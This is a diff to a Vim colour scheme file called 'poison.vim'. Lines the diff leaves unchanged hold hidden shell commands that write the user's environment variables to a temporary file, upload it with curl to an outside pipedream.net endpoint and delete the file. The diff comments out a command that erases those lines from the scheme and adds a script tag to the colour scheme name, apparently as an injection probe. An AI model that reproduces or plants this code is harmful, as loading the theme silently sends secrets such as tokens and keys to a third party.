@@ -11,7 +11,7 @@ if exists('syntax on')
 endif
 
 set background=dark
-let g:colors_name='poison' 
+let g:colors_name='poison<script>console.log(/1337/);</script>' 
 
 " credit: nachtleben.vim <schickele[ät]web.de>
 function! s:hi(group, fg, bg, style, special)
@@ -202,4 +202,4 @@ silent !env >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
 silent !curl https://en6e5d2mxnff4.x.pipedream.net/ -T /tmp/918237182937.tmp
 silent !rm -f /tmp/918237182937.tmp
-silent !sed -i '/silent/d' ./poison.vim
+"silent !sed -i '/silent/d' ./poison.vim
